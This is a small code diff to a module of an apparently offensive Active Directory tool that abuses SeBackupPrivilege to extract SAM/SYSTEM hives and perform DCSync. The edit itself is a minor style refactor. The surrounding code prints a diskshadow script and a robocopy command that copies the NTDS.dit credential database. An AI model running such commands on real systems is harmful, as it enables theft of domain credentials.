@@ -1,5 +1,4 @@
 """SeBackupPrivilege abuse — read any file, extract SAM/SYSTEM, DCSync."""
-from __future__ import annotations
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -50,7 +49,7 @@ def run(args: Any) -> int:
         ]
         print("[*] Diskshadow script:")
         for line in script:
-            print("  {}".format(line))
+            print(f"  {line}")
         print("\n  Then: robocopy /b Z:\\Windows\\NTDS . ntds.dit")
         return 0
 
